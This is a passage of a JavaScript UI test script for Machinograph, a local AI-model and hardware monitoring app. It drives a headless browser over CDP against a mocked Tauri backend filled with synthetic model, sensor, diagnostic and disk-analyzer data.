/**
 * Verificación de interfaz de Machinograph: 37 comprobaciones sobre el `dist` REAL.
 *
 * Qué comprueba (y por qué así):
 *  - El puente Tauri se SIMULA con el contrato real (`__TAURI_INTERNALS__.invoke`
 *    + `plugin:event|listen`), porque en un navegador no hay backend Rust. Los
 *    datos del simulador son los del contrato: si el backend cambia una forma, la
 *    prueba deja de valer y hay que actualizarla a mano (no se genera sola).
 *  - El panel de logs recibe las líneas REALES de llama-swap (se piden a
 *    http://127.0.0.1:8080/logs desde Node, no se inventan).
 *  - Nada de teclado/ratón fuera del navegador: solo se interactúa con la página.
 *
 * CÓMO SE LANZA (necesita tres cosas ya en marcha):
 *
 *     pnpm build                       # el dist que se va a probar
 *     pnpm preview                     # sirviendo en http://localhost:4173
 *     brave --headless=new --remote-debugging-port=9222 \
 *           --user-data-dir=~/.cache/playwright-brave-profile   # (perfil APARTE)
 *     node assets/verificar-ui.mjs
 *
 * Por qué por CDP y con un perfil aparte: este Brave es Flatpak y Playwright no
 * puede lanzarlo (el sandbox no propaga el pipe de depuración), así que se lanza
 * a mano con el puerto abierto y la prueba se CONECTA. Nunca con el perfil del
 * usuario: se le abrirían y cerrarían pestañas mientras trabaja.
 *
 * Variables: `URL_APP` (por defecto http://localhost:4173/) y `CDP`
 * (http://127.0.0.1:9222). Con `CAPTURAS=<dir>` además deja capturas para mirar
 * las pantallas a mano, que es el otro nivel de comprobación que sí hace falta.
 */
import { createRequire } from "node:module";
import { existsSync, readdirSync } from "node:fs";
import { homedir } from "node:os";
import { join } from "node:path";

const require = createRequire(import.meta.url);

/**
 * Dónde está Playwright.
 *
 * POR QUÉ SE BUSCA Y NO SE FIJA: vive en el caché de `npx`/`pnpm dlx`, en una
 * carpeta cuyo nombre es un hash distinto en cada máquina. Antes estaba escrita a
 * fuego (y con la carpeta del autor dentro), así que en cualquier otro equipo la
 * comprobación no arrancaba. Se busca por el HOME real y, si no aparece, se deja
 * que lo resuelva Node (por si está instalado en el proyecto).
 */
function rutaPlaywright() {
  if (process.env.PLAYWRIGHT) return process.env.PLAYWRIGHT;
  const cache = join(homedir(), ".npm", "_npx");
  try {
    for (const d of readdirSync(cache)) {
      const p = join(cache, d, "node_modules", "playwright");
      if (existsSync(p)) return p;
    }
  } catch {
    // Sin caché de npx: se intenta el paquete del proyecto.
  }
  return "playwright";
}

const { chromium } = require(rutaPlaywright());

const URL_APP = process.env.URL_APP ?? "http://localhost:4173/";
const CDP = process.env.CDP ?? "http://127.0.0.1:9222";

/* ── Datos sintéticos, con la forma EXACTA del contrato ───────────────────── */

const ahoraSeg = Math.floor(Date.now() / 1000);
const R = (p) => `/home/usuario/models/${p}`;

const modelos = [
  // [nombre, tipo, formato, bytes, familia, motor, quant] — `quant` solo en los
  // .gguf, que es donde el backend puede deducirla del nombre; en el resto `null`
  // a propósito (y en la interfaz eso es "—", nunca "desconocida").
  ["qwen2.5-32b-instruct-q4_k_m.gguf", "texto", "GGUF", 19.4e9, "llama.cpp", "llama-swap / llama-server", "Q4_K_M"],
  ["mimo-9b-q8_0.gguf", "texto", "GGUF", 9.6e9, "llama.cpp", "llama-swap / llama-server", "Q8_0"],
  ["modelo-27b-pq2_0.gguf", "texto", "GGUF", 6.5e9, "llama.cpp", "llama-swap / llama-server", "PQ2_0"],
  ["modelo-8b.gguf", "texto", "GGUF", 4.2e9, "llama.cpp", "llama-swap / llama-server", null],
  ["mmproj-mimo-9b-f16.gguf", "vision", "GGUF", 0.9e9, "llama.cpp", "llama-swap / llama-server", "F16"],
  ["es_ES-sharvard-medium.onnx", "audio", "ONNX", 63e6, "piper", "piper", null],
  ["en_US-lessac-high.onnx", "audio", "ONNX", 109e6, "piper", "piper", null],
  ["coqui-es-vits.onnx", "audio", "ONNX", 74e6, "Coqui TTS", "Coqui TTS", null],
  ["qwen2.5-coder-7b-q5_k_m.gguf", "texto", "GGUF", 5.4e9, "LM Studio", "LM Studio", "Q5_K_M"],
  ["llama-3.2-3b-q4_k_m.gguf", "texto", "GGUF", 2.0e9, "LM Studio", "LM Studio", "Q4_K_M"],
  ["nomic-embed-text-v1.5.gguf", "embedding", "GGUF", 0.27e9, "LM Studio", "LM Studio", null],
  ["sdxl-base-1.0.safetensors", "imagen", "safetensors", 6.9e9, "ComfyUI", "ComfyUI", null],
  ["sd-vae-ft-mse.safetensors", "vae", "safetensors", 0.33e9, "ComfyUI", "ComfyUI", null],
  ["controlnet-canny-sdxl.safetensors", "control", "safetensors", 2.5e9, "ComfyUI", "ComfyUI", null],
  ["clip-l.safetensors", "codificador", "safetensors", 0.25e9, "ComfyUI", "ComfyUI", null],
  ["wan2.2-t2v-14b.safetensors", "video", "safetensors", 28e9, "ComfyUI", "ComfyUI", null],
  ["style-anime.safetensors", "adaptador", "safetensors", 0.22e9, "ComfyUI", "ComfyUI", null],
  ["cosmos-1.0-diffusion-7b.safetensors", "imagen", "safetensors", 14e9, "ComfyUI", "ComfyUI", null],
  ["clip-g.safetensors", "codificador", "safetensors", 0.7e9, "ComfyUI", "ComfyUI", null],
  ["voz-clonada-rvc.pth", "otro", "PyTorch", 0.055e9, "ComfyUI", null, null],
].map(([nombre, tipo, formato, tamano_bytes, familia, motor, quant], i) => ({
  ruta: R(nombre),
  nombre,
  tipo,
  formato,
  tamano_bytes,
  familia,
  motor,
  quant,
  modificado: ahoraSeg - i * 3600,
}));

// Una fila por modelo encajable, con los cuatro niveles y una vieja de verdad.
const fits = [
  {
    modelo: R("qwen2.5-32b-instruct-q4_k_m.gguf"),
    runtime: "vulkan",
    ctx_max: 262144,
    ngl: -1,
    encaje: "Gpu",
    pedido: null,
    detalle: "cabe entero en la GPU: 262144 de contexto con todas las capas en la GPU",
    ts: ahoraSeg - 240, // hace 4 min
  },
  {
    modelo: R("mimo-9b-q8_0.gguf"),
    runtime: "bin",
    ctx_max: 131072,
    ngl: 41,
    encaje: "Mixto",
    pedido: null,
    detalle: "cabe, pero con 41 capas en la GPU y el resto en CPU: funcionará mucho más lento",
    ts: ahoraSeg - 3600,
  },
  {
    modelo: R("modelo-27b-pq2_0.gguf"),
    runtime: "vulkan",
    ctx_max: 16384,
    ngl: -1,
    encaje: "NoCabe",
    pedido: 262144,
    detalle: "no cabe con 262144 de contexto: entran 16384",
    ts: ahoraSeg - 120,
  },
  {
    modelo: R("modelo-8b.gguf"),
    runtime: "",
    ctx_max: 0,
    ngl: 0,
    encaje: "Error",
    pedido: null,
    detalle: "ningún runtime supo leer el fichero para calcular el encaje",
    ts: ahoraSeg - 90,
  },
  {
    modelo: R("qwen2.5-coder-7b-q5_k_m.gguf"),
    runtime: "vulkan",
    ctx_max: 98304,
    ngl: -1,
    encaje: "Gpu",
    pedido: null,
    detalle: "cabe entero en la GPU: 98304 de contexto con todas las capas en la GPU",
    ts: ahoraSeg - 7200, // 2 h: el cálculo está VIEJO
  },
];

const snapshot = {
  ts: ahoraSeg,
  uptime_secs: 7384,
  boot: ahoraSeg - 7384,
  // El sistema del mock es Linux: es lo que decide qué bloques se enseñan (el
  // reloj de memoria de la GPU, los ventiladores de la placa…).
  so: "linux",
  so_nombre: "Linux",
  system: {
    cpu_pct: 12.5,
    load1: 0.8,
    load5: 0.6,
    load15: 0.5,
    cores: 16,
    mem: { total_mb: 32768, used_mb: 13200, free_mb: 19568, avail_mb: 22400, pct: 40 },
    swap: { total_mb: 8192, used_mb: 0, free_mb: 8192, avail_mb: 8192, pct: 0 },
  },
  gpu: [
    {
      id: 0,
      name: "AMD Radeon RX 6800 XT",
      driver: "amdgpu",
      temp_c: 41,
      mem_temp_c: 46,
      power_w: 32,
      mem_used_mb: 512,
      mem_total_mb: 16384,
      mem_pct: 3,
      util: 0,
      clock_mhz: 2100,
      fan_rpm: 900,
      fan_pct: 20,
      throttle: null,
    },
  ],
  display: [
    {
      name: "DP-1",
      status: "connected",
      connected: true,
      primary: true,
      w: 2560,
      h: 1440,
      hz: 144,
      offset_x: 0,
      offset_y: 0,
      modes: [{ w: 2560, h: 1440, hz: 144, flags: "+*" }],
      current_flags: "+*",
    },
  ],
  servers: [
    {
      id: "llama-swap",
      name: "llama-swap",
      kind: "llama-swap",
      port: 8080,
      state: "active",
      process_active: true,
      version: null,
      pid: 4242,
      proc_uptime_secs: 7200,
      models: [
        { id: "modelo-27b", label: "modelo-27b", state: "loaded", quant: "PQ2_0", size_mb: 6500 },
        { id: "mimo-9b", label: "mimo-9b", state: "unloaded", quant: "Q8_0", size_mb: 9600 },
      ],
      error: null,
    },
  ],
  ai_procs: [{ pid: 4242, name: "llama-swap", cmd: "llama-swap --config swap.yaml", cpu_pct: 1.2, mem_mb: 84, uptime_secs: 7200, tag: "swap" }],
  // OJO: aquí NO hay `disk_models`. El backend retiró ese campo (`Snapshot.
  // disk_models`) porque era una segunda fuente de verdad de la lista de modelos;
  // la única es `inventario:listar`. Si la interfaz volviera a leerlo, el
  // contrato simulado no lo tendría y el fallo saldría a la luz.
  disk: { total_gb: 1863, used_gb: 1204, free_gb: 659, pct: 65, mount: "/var/home" },
  // Los sensores, con las formas y los nombres REALES de esta máquina (leídos de
  // /sys/class/hwmon): el nct6683 de la placa con sus ventiladores con nombre, el
  // k10temp de la CPU, los dos NVMe, la WiFi y los dos chips de la placa, uno de
  // ellos con todos los ventiladores a 0 (el driver duplicado).
  hardware: {
    grupos: [
      {
        chip: "k10temp", chip_legible: "CPU (k10temp)", driver: "k10temp", descartados: 0, ventiladores_a_cero: false,
        items: [
          { chip: "k10temp", chip_legible: "CPU (k10temp)", etiqueta: "Tctl", clase: "temperatura", valor: 66.5, unidad: "°C", max: null, critico: null, fuente: "/sys/class/hwmon/hwmon5/temp1_input" },
          { chip: "k10temp", chip_legible: "CPU (k10temp)", etiqueta: "Tccd1", clase: "temperatura", valor: 57.5, unidad: "°C", max: null, critico: null, fuente: "/sys/class/hwmon/hwmon5/temp3_input" },
        ],
      },
      {
        chip: "nct6683", chip_legible: "Placa base (nct6683)", driver: "nct6687", descartados: 16, ventiladores_a_cero: false,
        items: [
          { chip: "nct6683", chip_legible: "Placa base (nct6683)", etiqueta: "CPU", clase: "temperatura", valor: 40, unidad: "°C", max: null, critico: null, fuente: "/sys/class/hwmon/hwmon3/temp1_input" },
          { chip: "nct6683", chip_legible: "Placa base (nct6683)", etiqueta: "System", clase: "temperatura", valor: 66, unidad: "°C", max: 71, critico: null, fuente: "/sys/class/hwmon/hwmon3/temp2_input" },
          { chip: "nct6683", chip_legible: "Placa base (nct6683)", etiqueta: "CPU Fan", clase: "ventilador", valor: 1692, unidad: "rpm", max: null, critico: null, fuente: "/sys/class/hwmon/hwmon3/fan1_input" },
          { chip: "nct6683", chip_legible: "Placa base (nct6683)", etiqueta: "Pump Fan", clase: "ventilador", valor: 1181, unidad: "rpm", max: null, critico: null, fuente: "/sys/class/hwmon/hwmon3/fan2_input" },
          { chip: "nct6683", chip_legible: "Placa base (nct6683)", etiqueta: "System Fan #1", clase: "ventilador", valor: 1007, unidad: "rpm", max: null, critico: null, fuente: "/sys/class/hwmon/hwmon3/fan3_input" },
          { chip: "nct6683", chip_legible: "Placa base (nct6683)", etiqueta: "System Fan #2", clase: "ventilador", valor: 0, unidad: "rpm", max: null, critico: null, fuente: "/sys/class/hwmon/hwmon3/fan4_input" },
          { chip: "nct6683", chip_legible: "Placa base (nct6683)", etiqueta: "VBat", clase: "voltaje", valor: 2.03, unidad: "V", max: null, critico: null, fuente: "/sys/class/hwmon/hwmon3/in13_input" },
          { chip: "nct6683", chip_legible: "Placa base (nct6683)", etiqueta: "CPU Vcore", clase: "voltaje", valor: 1.34, unidad: "V", max: null, critico: null, fuente: "/sys/class/hwmon/hwmon3/in4_input" },
        ],
      },
      {
        chip: "nct6798", chip_legible: "Placa base (nct6798)", driver: "nct6775", descartados: 6, ventiladores_a_cero: true,
        items: [
          { chip: "nct6798", chip_legible: "Placa base (nct6798)", etiqueta: "fan1", clase: "ventilador", valor: 0, unidad: "rpm", max: null, critico: null, fuente: "/sys/class/hwmon/hwmon8/fan1_input" },
          { chip: "nct6798", chip_legible: "Placa base (nct6798)", etiqueta: "in1", clase: "voltaje", valor: 1.68, unidad: "V", max: null, critico: null, fuente: "/sys/class/hwmon/hwmon8/in1_input" },
        ],
      },
      {
        chip: "nvme", chip_legible: "NVMe", driver: "nvme", descartados: 0, ventiladores_a_cero: false,
        items: [
          { chip: "nvme", chip_legible: "NVMe", etiqueta: "Composite", clase: "temperatura", valor: 44.85, unidad: "°C", max: 89.85, critico: 94.85, fuente: "/sys/class/hwmon/hwmon0/temp1_input" },
        ],
      },
    ],
    descartados: 16,
    cpu_potencia_w: 62.4,
    cpu_frecuencia: { actual_mhz: 4811.84, media_mhz: 3502.83, min_mhz: 1754.3, max_mhz: 4811.84, nucleos: 16 },
    discos_temp: [
      { nombre: "nvme0", temp_c: 44.85, fuente: "hwmon (nvme, Composite)" },
      { nombre: "nvme1", temp_c: 41.85, fuente: "hwmon (nvme, Composite)" },
    ],
    discos_caudal: [
      { nombre: "nvme0n1", leer_b_s: 12_400_000, escribir_b_s: 240_000 },
      { nombre: "sda", leer_b_s: 0, escribir_b_s: 0 },
    ],
    red: [
      { nombre: "enp5s0", rx_b_s: 1_240_000, tx_b_s: 84_000, activa: true },
      { nombre: "wlp8s0", rx_b_s: 0, tx_b_s: 0, activa: false },
    ],
  },
  note: "datos sintéticos para la verificación de interfaz",
  // El desglose por tipo se CALCULA de la misma lista, como en el backend: así
  // los totales que se enseñan y las filas que hay no pueden discrepar.
  inventario: {
    ficheros: modelos.length,
    bytes: modelos.reduce((a, m) => a + m.tamano_bytes, 0),
    por_tipo: modelos.reduce((acc, m) => {
      const t = acc.find((x) => x.tipo === m.tipo);
      if (t) { t.ficheros += 1; t.bytes += m.tamano_bytes; } else acc.push({ tipo: m.tipo, ficheros: 1, bytes: m.tamano_bytes });
      return acc;
    }, []),
  },
};

const llmfitModelos = [
  ["Qwen2.5 32B Instruct", "Qwen", 32, "Perfect", "Q4_K_M", 21.4, 19.6, 8.4, "Apache-2.0", { speed: 40, quality: 95, fit: 100, context: 90 }],
  ["MiMo 9B", "Xiaomi", 9, "Good", "Q8_0", 48.2, 9.6, 7.9, "Apache-2.0", { speed: 75, quality: 70, fit: 95, context: 70 }],
  ["Modelo 27B", "Prism", 27, "Marginal", "PQ2_0", 16.1, 6.5, 7.2, "MIT", { speed: 35, quality: 85, fit: 60, context: 80 }],
  ["Llama 3.2 3B", "Meta", 3, "Perfect", "Q4_K_M", 96.5, 2.0, 6.8, "Llama-3.2", { speed: 98, quality: 45, fit: 100, context: 50 }],
  ["SDXL Base 1.0", "Stability", 3.5, "Poor", null, null, 6.9, 5.1, "CreativeML", { speed: 20, quality: 60, fit: 30, context: 40 }],
].map(([name, provider, params_b, fit_level, best_quant, tps, disk, score, license, components]) => ({
  name,
  provider,
  params_b,
  parameter_count: `${params_b}B`,
  use_case: "chat",
  category: "Chat",
  fit_level,
  run_mode: "gpu",
  runtime: "llama.cpp",
  best_quant,
  estimated_tps: tps,
  measured_tps: null,
  disk_size_gb: disk,
  memory_required_gb: disk * 1.1,
  utilization_pct: 80,
  context_length: 32768,
  effective_context_length: 32768,
  score,
  // Los cuatro componentes que llmfit publica de verdad (`score_components`), con
  // valores que hacen que el deslizador CAMBIE el orden: el 3B es el más rápido y
  // el 32B el más capaz, así que el peso decide cuál va primero.
  score_components: components,
  license,
  capabilities: ["chat"],
  is_moe: false,
  installed: false,
  estimate_confidence: "estimated",
  verify_command: null,
  llamacpp_command: null,
  notes: [],
}));

/* ── Diagnóstico y conexiones (contrato de diagnostico.rs / conexiones.rs) ── */

/**
 * Las CUATRO variantes de `Estado`, una de cada, y DESORDENADAS a propósito
 * (la primera es la que va bien): así la prueba comprueba que la vista ordena
 * ellas sola, con lo que está mal delante.
 */
const comprobaciones = [
  {
    id: "gpu",
    titulo: "Driver de la GPU",
    estado: "ok",
    detalle: "amdgpu presente con 1 GPU: AMD Radeon RX 6800 XT, 16.0 GB de VRAM",
    como_arreglarlo: null,
  },
  {
    id: "mclk",
    titulo: "Reloj de memoria (MCLK)",
    estado: "aviso",
    detalle: "el MCLK está clavado a 96 MHz: los modelos irían ~15x más lentos",
    como_arreglarlo: "~/Proyectos/modelo-local-local/scripts/mclk-guard.sh --fix-display-only",
  },
  {
    id: "llmfit",
    titulo: "llmfit",
    estado: "problema",
    detalle: "no se encontró el binario llmfit en el PATH",
    como_arreglarlo: "cargo install llmfit (o dejarlo en ~/.local/bin)",
  },
  {
    id: "disco",
    titulo: "Espacio en disco",
    estado: "desconocido",
    detalle: "no se pudo leer el espacio libre de /var/home",
    como_arreglarlo: null,
  },
];

/**
 * Los TRES clientes reales del backend: gentle-shell (con home aislado), mcode y
 * Codex. Los nombres, las rutas y las notas son los de `conexiones.rs`; la
 * evidencia son líneas de su fichero que mencionan un endpoint local
 * (`127.0.0.1`, `localhost`, `::1`), recortadas como las recorta el backend.
 */
const clientes = [
  {
    id: "gentle-shell",
    nombre: "gentle-shell (Pi)",
    config: "/home/usuario/.gentle-shell/agent/models.json",
    existe: true,
    apunta_local: true,
    admite_escritura: true,
    modelos_declarados: ["modelo-27b", "mimo-9b", "mimo-9b-fast"],
    como_lo_tiene: ['"baseUrl": "http://127.0.0.1:8080/v1",', '  "apiKey": "local",'],
    nota: "Home aislado: las herramientas que 'conectan tu agente' suelen escribir en ~/.pi/agent/models.json, que NO es este fichero.",
  },
  {
    id: "pi",
    nombre: "Pi (~/.pi)",
    config: "/home/usuario/.pi/agent/models.json",
    existe: true,
    apunta_local: false,
    admite_escritura: true,
    modelos_declarados: [],
    como_lo_tiene: [],
    nota: "Es el fichero al que escriben las herramientas que «conectan tu agente» cuando no conocen el home aislado de gentle-shell.",
  },
  {
    id: "claude",
    nombre: "Claude Code",
    config: "/home/usuario/.claude/settings.json",
    existe: true,
    apunta_local: false,
    admite_escritura: false,
    modelos_declarados: [],
    // La evidencia: su variable de entorno, tal cual está en el fichero.
    como_lo_tiene: [],
    nota: "Se apunta con la variable `ANTHROPIC_BASE_URL` de su `settings.json`, que lleva más ajustes (claves, modelos, permisos): se detecta y se enseña, pero no se reescribe.",
  },
  {
    id: "mcode",
    nombre: "MiniMax Code (mcode)",
    config: "/home/usuario/.minimax/config.yaml",
    existe: true,
    apunta_local: true,
    admite_escritura: false,
    modelos_declarados: [],
    como_lo_tiene: ["baseURL: http://127.0.0.1:8080/v1"],
    nota: "Su formato de proveedores no está comprobado aquí, así que no se toca.",
  },
  {
    id: "codex",
    nombre: "Codex",
    config: "/home/usuario/.codex/config.toml",
    existe: false,
    apunta_local: false,
    admite_escritura: false,
    modelos_declarados: [],
    como_lo_tiene: [],
    nota: "Se enseña su configuración real (TOML con `model_providers`) y no se reescribe.",
  },
];;

const datos = {
  "snapshot:now": snapshot,
  "inventario:listar": {
    modelos,
    resumen: modelos.reduce((acc, m) => {
      const t = acc.find((x) => x.tipo === m.tipo);
      if (t) {
        t.ficheros += 1;
        t.bytes += m.tamano_bytes;
      } else acc.push({ tipo: m.tipo, ficheros: 1, bytes: m.tamano_bytes });
      return acc;
    }, []),
  },
  "fits:listar": fits,
  "servers:list": [{ id: "llama-swap", name: "llama-swap", kind: "llama-swap", port: 8080, cmd: "llama-swap --config swap.yaml", enabled: true }],
  "actions:recent": [
    { ts: ahoraSeg - 300, kind: "modelo:borrar", detail: "modelo.bin", ok: true, message: "movido a la papelera" },
    { ts: ahoraSeg - 900, kind: "perf:fit", detail: "qwen2.5-32b...gguf", ok: false, message: "no se pudo calcular el encaje" },
  ],
  "updates:recent": [],
  "perf:tools": [{ nombre: "vulkan", dir: "/opt/llama.cpp-vulkan", fit: "/opt/llama.cpp-vulkan/llama-fit-params", bench: "/opt/llama.cpp-vulkan/llama-bench" }],
  // Una medida EN AISLADO ya guardada: sirve para comprobar que la medición
  // sirviendo (que añade la prueba) se distingue de ella en el histórico en vez
  // de mezclarse.
  "benchmarks:recent": [
    { ts: ahoraSeg - 600, modelo: R("qwen2.5-32b-instruct-q4_k_m.gguf"), runtime: "llama-bench", tipo: "decode", n_prompt: 512, n_gen: 128, tok_s: 26.1, desviacion: 0.4, build: "b6123", gpu: "AMD Radeon RX 6800 XT" },
  ],
  "metrics:recent": Array.from({ length: 10 }, (_, i) => ({
    ts: ahoraSeg - (10 - i) * 60,
    cpu: 10 + i,
    mem: 40 + i,
    disk: 65,
    gpu_mem_used: 500 + i * 10,
    gpu_mem_total: 16384,
    gpu_temp: 40 + i,
    gpu_power: 30 + i,
  })),
  "settings:get": {
    snapshot_interval_ms: { valor: 2000, por_defecto: 2000, min: 500, max: 10000, descripcion: "cada cuánto se pide la foto", guardado: false },
    metric_retention_hours: { valor: 24, por_defecto: 24, min: 1, max: 720, descripcion: "cuántas horas de métricas se guardan", guardado: false },
  },
  "llmfit:estado": { instalado: true, binario: "/home/usuario/.local/bin/llmfit", version: "0.4.2", sistema: null },
  "llmfit:sistema": {
    cpu_name: "AMD Ryzen 7 5800X",
    cpu_cores: 16,
    available_ram_gb: 32,
    backend: "vulkan",
    gpu_name: "AMD Radeon RX 6800 XT",
    gpu_vram_gb: 16,
    gpu_count: 1,
    gpus: [],
  },
  "llmfit:recomendar": {
    sistema: {
      cpu_name: "AMD Ryzen 7 5800X",
      cpu_cores: 16,
      available_ram_gb: 32,
      backend: "vulkan",
      gpu_name: "AMD Radeon RX 6800 XT",
      gpu_vram_gb: 16,
      gpu_count: 1,
      gpus: [],
    },
    modelos: llmfitModelos,
  },
  // La memoria de la GPU: un modelo servido, con su configuración real (la línea
  // de comandos es la del Modelo 8B de esta máquina, copiada de llama-swap).
  "memoria:cargados": {
    modelos: [
      {
        id: "mimo-9b-q8_0",
        nombre: "MiMo 9B (Q8_0)",
        // La MISMA ruta que la fila del inventario: así la interfaz puede casar el
        // modelo servido con el fichero que se va a borrar, que es lo que avisa
        // antes de borrar algo que el motor tiene abierto.
        ruta: R("mimo-9b-q8_0.gguf"),
        pesos_gb: 2.22,
        contexto: 65536,
        ngl: 99,
        kv_quant: "q4_0",
        flash_attention: true,
        ttl_s: 1800,
        banderas: ["-c 65536", "-ngl 99", "-ctk q4_0", "-ctv q4_0", "-fa on"],
        cmd: "llama-server -m /home/usuario/models/modelos/modelo-8b-Q2_0.gguf -ngl 99 -fa on -c 65536 --cache-type-k q4_0 --cache-type-v q4_0",
      },
    ],
    pesos_gb: 2.22,
    vram_usada_gb: 9.84,
    vram_total_gb: 16,
    resto_gb: 7.62,
  },
  "descarga:estado": {
    fase: "descargando",
    modelo: "Qwen2.5 32B Instruct (Q4_K_M)",
    linea: "Downloading 6.7/19.6 GB",
    pct: 34.2,
    descargado_gb: 6.7,
    total_gb: 19.6,
    b_s: 12_400_000,
    eta_s: 1080,
    carpeta: "/home/usuario/.cache/llmfit/models",
    error: null,
  },
  "entorno:red": {
    ip: "192.168.0.104",
    interfaces: [
      { nombre: "enp5s0", ip: "192.168.0.104" },
      { nombre: "wlp8s0", ip: "192.168.1.50" },
    ],
  },
  "entorno:arranque": {
    activado: false,
    fichero: "/home/usuario/.config/autostart/machinograph.desktop",
    comando: null,
  },
  "entorno:carpetas": {
    carpetas: [
      { ruta: "/home/usuario/models", familia: "llama.cpp", existe: true },
      { ruta: "/home/usuario/.lmstudio/models", familia: "LM Studio", existe: true },
      { ruta: "/home/usuario/ComfyUI/models", familia: "ComfyUI", existe: false },
    ],
  },
  "diagnostico:comprobar": comprobaciones,
  "conexiones:clientes": clientes,
  // La puerta de enlace y el uso que ha contado. Los números son los de una
  // sesión real de trabajo: prompt largo, caché funcionando y TTFT bajo.
  "gateway:estado": {
    activa: true,
    direccion: "127.0.0.1",
    puerto: 8090,
    // El puerto REAL en el que escucha (puede no ser el configurado si estaba
    // ocupado) y el aviso de por qué. La interfaz enseña el real: mandar a un
    // cliente al configurado cuando escucha en otro es mandarlo a la nada.
    puerto_escuchando: 8090,
    aviso_puerto: null,
    destino: "http://127.0.0.1:8080",
    requiere_clave: true,
    clave: "9f2c1a4b6d8e0f3a5c7b9d1e2f4a6b8c",
    url: "http://127.0.0.1:8090/v1",
    error: null,
  },
  "uso:resumen": {
    periodo: "hoy",
    desde: ahoraSeg - 3600,
    resumen: {
      peticiones: 42,
      con_tokens: 40,
      prompt_tokens: 128400,
      completion_tokens: 9820,
      cached_tokens: 96100,
      con_ttft: 40,
      ttft_medio_ms: 640.5,
      tok_s: 34.2,
    },
    por_modelo: [
      { modelo: "modelo-27b", peticiones: 30, prompt_tokens: 98000, completion_tokens: 7100 },
      { modelo: "mimo-9b", peticiones: 12, prompt_tokens: 30400, completion_tokens: 2720 },
    ],
    diario: Array.from({ length: 14 }, (_, i) => ({
      dia: `2026-09-${String(14 + i).padStart(2, "0")}`,
      peticiones: [3, 0, 8, 12, 5, 0, 0, 21, 9, 14, 7, 0, 4, 42][i],
      prompt_tokens: 1000 * i,
      completion_tokens: 100 * i,
    })),
    recientes: [
      { ts: ahoraSeg - 60, modelo: "modelo-27b", ruta: "/v1/chat/completions", metodo: "POST", estado: 200, prompt_tokens: 55, completion_tokens: 12, cached_tokens: 51, ttft_ms: 569, generacion_ms: 351, duracion_ms: 569, bytes_entrada: 131, bytes_salida: 750, origen: "local", cliente: "curl/8.18.0" },
      { ts: ahoraSeg - 300, modelo: "mimo-9b", ruta: "/v1/chat/completions", metodo: "POST", estado: 200, prompt_tokens: 4100, completion_tokens: 220, cached_tokens: 0, ttft_ms: 2400, generacion_ms: 6400, duracion_ms: 8800, bytes_entrada: 9000, bytes_salida: 41000, origen: "local", cliente: "Codex/0.155" },
      { ts: ahoraSeg - 900, modelo: "modelo-27b", ruta: "/v1/messages", metodo: "POST", estado: 200, prompt_tokens: null, completion_tokens: null, cached_tokens: null, ttft_ms: null, generacion_ms: null, duracion_ms: 30, bytes_entrada: 80, bytes_salida: 40, origen: "red", cliente: "claude-cli/2.0" },
    ],
    retencion_dias: 90,
    // La vista enseña la config que viene CON el uso (una lectura, un estado); se
    // rellena abajo con el mismo objeto para que no puedan discrepar.
    config: null,
  },
  // El reloj de memoria de la GPU: el fallo silencioso que vigila el panel.
  // Se simula DEGRADADO (mínimo 96 MHz con la GPU trabajando) porque es el caso
  // que tiene que hacer saltar el aviso; el estado sano no pinta nada.
  "gpu:mclk": {
    activo_mhz: 96,
    max_mhz: 1000,
    niveles: [
      { idx: 0, mhz: 96, activo: true },
      { idx: 1, mhz: 500, activo: false },
      { idx: 2, mhz: 1000, activo: false },
    ],
    gpu_busy: 97,
    mem_busy: 88,
    degradado: true,
    veredicto: "El reloj está en el nivel mínimo con la GPU trabajando: los modelos van ~15x más lentos. Cicla el modo de pantalla para recuperarlo.",
  },

  // ── Almacenamiento: el analizador de disco ────────────────────────────────
  // El contrato REAL de `almacen.rs`: los hijos DIRECTOS con su tamaño recursivo
  // (como `du --max-depth=1`). Los tamaños son los de este equipo, redondeados.
  "almacen:arbol": {
    ruta: "/home/usuario",
    bytes: 320_000_000_000,
    ficheros: 1_272_109,
    dirs: 156_185,
    hijos: [
      { ruta: "/home/usuario/.local", nombre: ".local", bytes: 65_000_000_000, ficheros: 300_000, dirs: 40_000, es_dir: true, modificado: 1758990000 },
      { ruta: "/home/usuario/.cache", nombre: ".cache", bytes: 32_900_000_000, ficheros: 210_000, dirs: 8_000, es_dir: true, modificado: 1758995000 },
      { ruta: "/home/usuario/models", nombre: "models", bytes: 31_800_000_000, ficheros: 42, dirs: 12, es_dir: true, modificado: 1758900000 },
      { ruta: "/home/usuario/Descargas", nombre: "Descargas", bytes: 20_500_000_000, ficheros: 61, dirs: 4, es_dir: true, modificado: 1758980000 },
      { ruta: "/home/usuario/pelicula.iso", nombre: "pelicula.iso", bytes: 3_000_000_000, ficheros: 1, dirs: 0, es_dir: false, modificado: 1758800000 },
    ],
    resto_n: 0,
    resto_bytes: 0,
    truncado: false,
    omitidos: 0,
    entradas: 1_428_294,
    ms: 14_272,
    // Una exclusión ha actuado en este recorrido: la interfaz tiene que decirlo y
    // cambiar el rótulo del total («Ocupa lo medido»), porque si no parecería que
    // la carpeta ocupa menos de lo que ocupa.
    excluidos: ["${HOME}/VMs"],
  },
  "almacen:grandes": [
    { ruta: "/home/usuario/.lmstudio/models/ornith/downloading.gguf.part", nombre: "downloading.gguf.part", bytes: 9_100_000_000, modificado: 1758994000 },
    { ruta: "/home/usuario/models/mimo-9b-q8/MiMo-9B-Q8_0.gguf", nombre: "MiMo-9B-Q8_0.gguf", bytes: 8_900_000_000, modificado: 1758900000 },
    { ruta: "/home/usuario/pelicula.iso", nombre: "pelicula.iso", bytes: 3_000_000_000, modificado: 1758800000 },
  ],
  "almacen:buscar": [
    { ruta: "/home/usuario/Descargas/pelicula.iso", nombre: "pelicula.iso", bytes: 3_000_000_000, es_dir: false, modificado: 1758800000 },
    { ruta: "/home/usuario/Descargas", nombre: "Descargas", bytes: null, es_dir: true, modificado: 1758980000 },
  ],
  "almacen:montajes": [
    { punto: "/var/home", fs: "/dev/nvme1n1p3", total: 497_330_159_616, usado: 312_597_299_200, libre: 173_553_369_088, uso_pct: 65 },
    { punto: "/var/mnt/NVME", fs: "/dev/nvme0n1p1", total: 491_106_508_800, usado: 294_436_651_008, libre: 171_647_741_952, uso_pct: 64 },
  ].map((m) => ({ ...m, dispositivo: m.fs, tipo: "btrfs", extraible: false })),

  // Las tres herramientas nuevas del analizador: repetidos, vacías y enlaces rotos.
  "almacen:duplicados": [
    {
      bytes: 3_000_000_000,
      rutas: [
        "/home/usuario/Descargas/pelicula.iso",
        "/home/usuario/copias/pelicula.iso",
        "/home/usuario/backup/pelicula.iso",
      ],
      desperdicio: 6_000_000_000,
    },
  ],
